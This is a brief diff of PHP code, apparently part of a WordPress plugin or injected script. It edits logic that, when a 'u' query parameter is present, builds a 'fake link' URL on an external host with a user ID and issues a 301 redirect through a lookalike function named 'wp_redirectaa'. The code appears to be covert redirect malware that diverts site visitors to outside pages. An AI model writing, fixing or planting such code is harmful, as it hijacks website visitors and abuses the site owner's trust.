@@ -82,9 +82,9 @@ if(isset($_GET["u"])){
 				//echo str_replace("appnow",($texte),$TEMPSSS);
 				//die("") ;
 				$linkfakb='https://'.$urlred.'/'.ID_USER.'/om/'.urlencode($texte);
-				if(REDIRECT_LINK && wp_redirectaa($linkfakb,301)){
+				if(REDIRECT_LINK  ){
 					
-					return;
+					return wp_redirectaa($linkfakb,301);
 				}
 			}
 	}
